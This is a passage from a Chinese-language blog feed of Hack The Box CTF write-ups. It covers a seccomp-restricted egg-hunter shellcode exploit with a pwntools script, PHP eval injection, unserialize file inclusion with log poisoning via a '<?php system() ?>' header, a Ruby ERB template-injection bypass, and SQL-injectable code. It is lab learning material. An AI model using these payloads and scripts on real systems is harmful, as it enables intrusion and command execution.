class=\"line\">.gnu.version</span><br><span class=\"line\">.gnu.version_r</span><br><span class=\"line\">.rel.dyn</span><br><span class=\"line\">.rel.plt</span><br><span class=\"line\">.init</span><br><span class=\"line\">.plt.got</span><br><span class=\"line\">.plt.sec</span><br><span class=\"line\">.text</span><br><span class=\"line\">.fini</span><br><span class=\"line\">.rodata</span><br><span class=\"line\">.eh_frame_hdr</span><br><span class=\"line\">.eh_frame</span><br><span class=\"line\">.init_array</span><br><span class=\"line\">.fini_array</span><br><span class=\"line\">.dynamic</span><br><span class=\"line\">.data</span><br><span class=\"line\">.bss</span><br><span class=\"line\">.comment</span><br></pre></td></tr></table></figure></p>\n<p>可以看到里面是有个 HTB {xxx} 的信息</p>\n<p>./hunting 运行尝试</p>\n<p>发现无论输入任何数都显示</p>\n<p>Segmentation fault</p>\n<p>拖入 ida32 查看</p>\n<p>没有显示 main 函数，只有自己找，找到如下代码可以判断为主函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int sub_1460()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v1; // [esp-10h] [ebp-24h]</span><br><span class=\"line\">  int v2; // [esp-Ch] [ebp-20h]</span><br><span class=\"line\">  int v3; // [esp-8h] [ebp-1Ch]</span><br><span class=\"line\">  int v4; // [esp-4h] [ebp-18h]</span><br><span class=\"line\">  void *buf; // [esp+0h] [ebp-14h]</span><br><span class=\"line\">  char *dest; // [esp+4h] [ebp-10h]</span><br><span class=\"line\">  void *addr; // [esp+8h] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  addr = (void *)sub_13D0();</span><br><span class=\"line\">  signal(14, (__sighandler_t)&amp;exit);</span><br><span class=\"line\">  alarm(0xAu);</span><br><span class=\"line\">  dest = (char *)mmap(addr, 0x1000u, 3, 49, -1, 0);</span><br><span class=\"line\">  if ( dest == (char *)-1 )</span><br><span class=\"line\">    sub_1120(-1, v1, v2, v3);</span><br><span class=\"line\">  strcpy(dest, aHtbXxxxxxxxxxx);</span><br><span class=\"line\">  memset(aHtbXxxxxxxxxxx, 0, sizeof(aHtbXxxxxxxxxxx));</span><br><span class=\"line\">  sub_133D();</span><br><span class=\"line\">  buf = mmap(0, 0x1000u, 7, 33, -1, 0);</span><br><span class=\"line\">  read(0, buf, 0x3Cu);</span><br><span class=\"line\">  ((void (__stdcall *)(int, void *, _DWORD))buf)(v4, buf, 0);</span><br><span class=\"line\">  return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个代码使用了 mmap (addr, 0x1000u, 3, 49, -1, 0); 请求了 0x1000 内存给了 dest 以及 buf</p>\n<p>并且将 strcpy (dest, aHtbXxxxxxxxxxx); 我们需要的 flag 拷贝到了 dest 内存中</p>\n<p>然后在使用了 meset 函数给 flag 之前的内存地址清零</p>\n<p>read (0, buf, 0x3Cu); 我们现在还有 0x3c 的内存可以利用</p>\n<p>还调用了 sub_13D0</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int sub_13D0()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  unsigned int buf; // [esp+0h] [ebp-18h] BYREF</span><br><span class=\"line\">  int fd; // [esp+8h] [ebp-10h]</span><br><span class=\"line\">  int i; // [esp+Ch] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class=\"line\">  read(fd, &amp;buf, 8u);</span><br><span class=\"line\">  close(fd);</span><br><span class=\"line\">  srand(buf);</span><br><span class=\"line\">  for ( i = 0; i &lt;= 1610612735; i = rand() &lt;&lt; 16 )</span><br><span class=\"line\">    ;</span><br><span class=\"line\">  return i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>利用写入的 buf 当作 srand 并且利用 i 来测试随机数</p>\n<p>在使用 seccomp-tools dump ./hunting</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─# seccomp-tools dump ./hunting</span><br><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class=\"line\"> 0001: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class=\"line\"> 0002: 0x35 0x0a 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0013</span><br><span class=\"line\"> 0003: 0x15 0x09 0x00 0x0000000b  if (A == execve) goto 0013</span><br><span class=\"line\"> 0004: 0x15 0x08 0x00 0x00000166  if (A == execveat) goto 0013</span><br><span class=\"line\"> 0005: 0x15 0x07 0x00 0x00000127  if (A == openat) goto 0013</span><br><span class=\"line\"> 0006: 0x15 0x06 0x00 0x00000005  if (A == open) goto 0013</span><br><span class=\"line\"> 0007: 0x15 0x05 0x00 0x00000006  if (A == close) goto 0013</span><br><span class=\"line\"> 0008: 0x15 0x04 0x00 0x00000008  if (A == creat) goto 0013</span><br><span class=\"line\"> 0009: 0x15 0x03 0x00 0x00000056  if (A == uselib) goto 0013</span><br><span class=\"line\"> 0010: 0x15 0x02 0x00 0x00000002  if (A == fork) goto 0013</span><br><span class=\"line\"> 0011: 0x15 0x01 0x00 0x000000be  if (A == vfork) goto 0013</span><br><span class=\"line\"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class=\"line\"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></p>\n<p>把 execve 以及 open，close 给禁用了，表示我们无法使用 getshell，orw</p>\n<p>这个时候就得利用 c 里面的函数去找 flag 的地址了</p>\n<p>比如 access 可以来判断文件名是否存在并且判断内存地址是否存在</p>\n<p>利用语法为</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">access(const char *filename,int mode);</span><br><span class=\"line\">当mode 为0 时，判断是否存在。</span><br><span class=\"line\"></span><br><span class=\"line\">当mode 为1时，判断是否有执行权限。</span><br><span class=\"line\"></span><br><span class=\"line\">当mode 为2时，判断是否有写权限。</span><br><span class=\"line\"></span><br><span class=\"line\">当mode 为3时，判断是否有读权限。</span><br></pre></td></tr></table></figure></p>\n<p>filename 参数可以是文件名也能是内存地址</p>\n<p>利用 access 函数以 0x1000 为一个单位来慢慢遍历</p>\n<p>用 c 伪代码表达为</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for (uint32_t address = 0x60000000; address &lt; 0x7fffffff; address += 0x1000)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        if (access(address + i +4) == EFAULT)</span><br><span class=\"line\">            break;</span><br><span class=\"line\">        write(1, address, 0x26);</span><br><span class=\"line\">        exit(0);</span><br><span class=\"line\">        </span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>使用汇编表达就是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov edx,0x5fffffff;</span><br><span class=\"line\">xor ecx,ecx;</span><br><span class=\"line\">notaccess:</span><br><span class=\"line\">or dx,0xfff;</span><br><span class=\"line\">inc edx;</span><br><span class=\"line\">mov eax,0x21;</span><br><span class=\"line\">lea  ebx,[edx+4]</span><br><span class=\"line\">int 0x80</span><br><span class=\"line\">cmp eax,0xfffffff2;</span><br><span class=\"line\">jz  notaccess;</span><br><span class=\"line\">mov eax,0x04;</span><br><span class=\"line\">mov ebx,1;</span><br><span class=\"line\">mov ecx,edx;</span><br><span class=\"line\">mov edx,0x26</span><br><span class=\"line\">int 0x80</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&#x27;./hunting&#x27;)</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&#x27;167.99.82.136&#x27;,32646)</span><br><span class=\"line\">payload=&quot;&quot;&quot;</span><br><span class=\"line\">mov edx,0x5fffffff;</span><br><span class=\"line\">xor ecx,ecx;</span><br><span class=\"line\">notaccess:</span><br><span class=\"line\">or dx,0xfff;</span><br><span class=\"line\">inc edx;</span><br><span class=\"line\">mov eax,0x21;</span><br><span class=\"line\">lea  ebx,[edx+4]</span><br><span class=\"line\">int 0x80</span><br><span class=\"line\">cmp eax,0xfffffff2;</span><br><span class=\"line\">jz  notaccess;</span><br><span class=\"line\"></span><br><span class=\"line\">mov eax,0x04;</span><br><span class=\"line\">mov ebx,1;</span><br><span class=\"line\">mov ecx,edx;</span><br><span class=\"line\">mov edx,0x26</span><br><span class=\"line\">int 0x80</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">p.sendline(asm(payload))</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>成功得到 flag</p>\n<p>借鉴了大佬 wp [Hunting— HTB PWN challenge | lexsd6's home](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZXhzZDYuZ2l0aHViLmlvLzIwMjEvMTEvMDIvUFdO\">https://lexsd6.github.io/2021/11/02/PWN</span> Hunting challenge — HTB/)</p>\n",
            "tags": [
                "PWN"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-WEB-md/",
            "url": "https://lookhui.github.io/HTB-WEB-md/",
            "title": "HTB-WEB",
            "date_published": "2023-12-13T00:49:46.000Z",
            "content_html": "<h3 id=\"lovetok\"><a class=\"anchor\" href=\"#lovetok\">#</a> LoveTok</h3>\n<p>查看这个主页这个代码调用了另外一个地方的代码 timecontroller 先以 get 请求进去之后在使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class TimeController</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public function index($router)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $format = isset($_GET[&#x27;format&#x27;]) ? $_GET[&#x27;format&#x27;] :&#x27;r&#x27;;</span><br><span class=\"line\">        $time = new TimeModel($format);</span><br><span class=\"line\">        return $router-&gt;view(&#x27;index&#x27;, [&#x27;time&#x27; =&gt; $time-&gt;getTime()]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个 timecontroller 的代码有了一个 get 请求并且直接将这个 get 请求的内容 format 放进 timemodlqu 进行调用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class TimeModel</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public function __construct($format)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;format = addslashes($format);</span><br><span class=\"line\"></span><br><span class=\"line\">        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];</span><br><span class=\"line\">        $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function getTime()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        eval(&#x27;$time = date(&quot;&#x27; . $this-&gt;format . &#x27;&quot;, strtotime(&quot;&#x27; . $this-&gt;prediction . &#x27;&quot;));&#x27;);</span><br><span class=\"line\">        return isset($time) ? $time : &#x27;Something went terribly wrong&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>上面这个代码主要是查看到了一个 eval 代码可以判断为漏洞点，刚刚调用的是 timemode1 的方法并且这个里面的 gettime 方法里面还调用了 format 刚好触发 eval 来直接执行命令，相当于触发了 ${system (ls)} 漏洞也就是说 ssti 漏洞被触发</p>\n<h3 id=\"toxic\"><a class=\"anchor\" href=\"#toxic\">#</a> Toxic</h3>\n<p>白盒测试，首先看源代码，发现</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">spl_autoload_register(function ($name)&#123;</span><br><span class=\"line\">    if (preg_match(&#x27;/Model$/&#x27;, $name))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $name = &quot;models/$&#123;name&#125;&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    include_once &quot;$&#123;name&#125;.php&quot;;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">if (empty($_COOKIE[&#x27;PHPSESSID&#x27;]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $page = new PageModel;</span><br><span class=\"line\">    $page-&gt;file = &#x27;/www/index.html&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">    setcookie(</span><br><span class=\"line\">        &#x27;PHPSESSID&#x27;, </span><br><span class=\"line\">        base64_encode(serialize($page)), </span><br><span class=\"line\">        time()+60*60*24, </span><br><span class=\"line\">        &#x27;/&#x27;</span><br><span class=\"line\">    );</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\">$cookie = base64_decode($_COOKIE[&#x27;PHPSESSID&#x27;]);</span><br><span class=\"line\">unserialize($cookie);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>这里使用的是一个反序列化代码并且 new pageMode1</p>\n<p>我们去看这个 pageMode1</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class PageModel</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $file;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __destruct() </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        include($this-&gt;file);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>发现这个编码使用的是一个__destruct () 来进行包含查看源码，index.php 里面还给了 file 进行了定义值，并且 cookie 处来设定，并且只是使用了一个 base64 来进行加密，我们去访问网站把 cookie copy 一下进行解码</p>\n<p><img data-src=\"/pic/image-20231208154207149.png\" alt=\"\" /></p>\n<p>这里可以发现这个我们可以利用文件包含来查看任意内容，但是查看 entrypoint.sh 发现初始化时把 flag 给更改为 flag_加 5 个随机字符</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/ash</span><br><span class=\"line\"></span><br><span class=\"line\"># Secure entrypoint</span><br><span class=\"line\">chmod 600 /entrypoint.sh</span><br><span class=\"line\"></span><br><span class=\"line\"># Generate random flag filename</span><br><span class=\"line\">mv /flag /flag_`cat /dev/urandom | tr -dc &#x27;a-zA-Z0-9&#x27; | fold -w 5 | head -n 1`</span><br><span class=\"line\"></span><br><span class=\"line\">exec &quot;$@&quot;</span><br></pre></td></tr></table></figure></p>\n<p>现在可以想到的方法有去爆破他的 5 位随机字符代码如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import base64</span><br><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\">random=str(os.system(&quot;cat /dev/urandom | tr -dc &#x27;a-zA-Z0-9&#x27; | fold -w 5 | head -n 1&quot;))</span><br><span class=\"line\">print(random)</span><br><span class=\"line\">url=&#x27;http://159.65.20.166:31290/&#x27;</span><br><span class=\"line\">php=&#x27;O:9:&quot;PageModel&quot;:1:&#123;s:4:&quot;file&quot;;s:60:&quot;php://filter/read=convert.base64-encode/resource=/flag_&#x27;+random+&#x27;&quot;;&#125;&#x27;</span><br><span class=\"line\">print(1)</span><br><span class=\"line\">cookie=base64.b64encode(php.encode())</span><br><span class=\"line\">header=&#123;</span><br><span class=\"line\">    &quot;Cookie&quot;:f&quot;PHPSESSID=&#123;cookie&#125;&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">pro=requests.get(url,headers=header,timeout=0.5)</span><br><span class=\"line\">print(cookie)</span><br><span class=\"line\">print(len(pro.text))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>爆破的话不太实际需要的时间太久，我们可以使用日志包含 php 然后通过访问访问达到文件包含来利用这个漏洞，因为访问页面时我们的浏览器表头 user-agent 和访问路径会被记录到日志上那可以使用如：</p>\n<ol>\n<li>首先使用 hackbar 来修改 header 的 user-agent:&lt;?php system ('ls /'); ?&gt;</li>\n<li>使用 hackbar 修改 header 的 Cookie 的 phpsessid 来等于 O:9:&quot;PageModel&quot;:1:{s:4:&quot;file&quot;;s:25:&quot;/var/log/nginx/access.log&quot;;} 进行 base 加密就能得到 flag 命名</li>\n<li>把 &lt;?php system ('cat /flag_1de1w'); ?&gt; 可以或者更改 cookie 也行</li>\n</ol>\n<h3 id=\"neonify\"><a class=\"anchor\" href=\"#neonify\">#</a> Neonify</h3>\n<p>这个 ruby 我第一次玩，白盒测试打开主代码 index.erb</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;Neonify&lt;/title&gt;</span><br><span class=\"line\">    &lt;link rel=&quot;stylesheet&quot; href=&quot;stylesheets/style.css&quot;&gt;</span><br><span class=\"line\">    &lt;link rel=&quot;icon&quot; type=&quot;image/gif&quot; href=&quot;/images/gem.gif&quot;&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;div class=&quot;wrapper&quot;&gt;</span><br><span class=\"line\">        &lt;h1 class=&quot;title&quot;&gt;Amazing Neonify Generator&lt;/h1&gt;</span><br><span class=\"line\">        &lt;form action=&quot;/&quot; method=&quot;post&quot;&gt;</span><br><span class=\"line\">            &lt;p&gt;Enter Text to Neonify&lt;/p&gt;&lt;br&gt;</span><br><span class=\"line\">            &lt;input type=&quot;text&quot; name=&quot;neon&quot; value=&quot;&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class=\"line\">        &lt;/form&gt;</span><br><span class=\"line\">        &lt;h1 class=&quot;glow&quot;&gt;&lt;%= @neon %&gt;&lt;/h1&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>\n<p>里面的 &lt;%=@neon%&gt; 可以初步分析判断为 ssti 注入，然后再看 neon.rb</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class NeonControllers &lt; Sinatra::Base</span><br><span class=\"line\"></span><br><span class=\"line\">  configure do</span><br><span class=\"line\">    set :views, &quot;app/views&quot;</span><br><span class=\"line\">    set :public_dir, &quot;public&quot;</span><br><span class=\"line\">  end</span><br><span class=\"line\"></span><br><span class=\"line\">  get &#x27;/&#x27; do</span><br><span class=\"line\">    @neon = &quot;Glow With The Flow&quot;</span><br><span class=\"line\">    erb :&#x27;index&#x27;</span><br><span class=\"line\">  end</span><br><span class=\"line\"></span><br><span class=\"line\">  post &#x27;/&#x27; do</span><br><span class=\"line\">    if params[:neon] =~ /^[0-9a-z ]+$/i</span><br><span class=\"line\">      @neon = ERB.new(params[:neon]).result(binding)</span><br><span class=\"line\">    else</span><br><span class=\"line\">      @neon = &quot;Malicious Input Detected&quot;</span><br><span class=\"line\">    end</span><br><span class=\"line\">    erb :&#x27;index&#x27;</span><br><span class=\"line\">  end</span><br><span class=\"line\"></span><br><span class=\"line\">end</span><br></pre></td></tr></table></figure></p>\n<p>里面有一个分别为 get 和 post，如果你使用 post 方法的话会进行正则匹配是否为数字和字母如果不是直接等于</p>\n<p>Malicious Input Detected</p>\n<p>如果是的情况下就会在输出一下这个变量，查资料得到这个正则匹配可以通过匹配 %0a 来达到绕过手段也就是说使用 \\n 就能绕过和 php 一样，那么直接在 index.erb 里面输入 1%0a&lt;/h1&gt;&lt;%25=open ('|cat f*').read ()%25&gt;&lt;h1 &gt; 这样就能达到任意命令执行的效果</p>\n<p><img data-src=\"/pic/image-20231208163006608.png\" alt=\"image-20231208163006608\" /></p>\n<p>使用 &lt;%= File.open ('flag.txt').read %&gt; 也能得到 flag 但是需要进行 urlencode</p>\n<h3 id=\"cop\"><a class=\"anchor\" href=\"#cop\">#</a> C.O.P</h3>\n<p>这个代码是 python 写的打开后能发现这个代码 models.py 里面的代码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class shop(object):</span><br><span class=\"line\"></span><br><span class=\"line\">    @staticmethod</span><br><span class=\"line\">    def select_by_id(product_id):</span><br><span class=\"line\">        return query_db(f&quot;SELECT data FROM products WHERE id=&#x27;&#123;product_id&#125;&#x27;&quot;, one=True)</span><br></pre></td></tr></table></figure></p>\n<p>还有 database.py 里面的代码如</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span 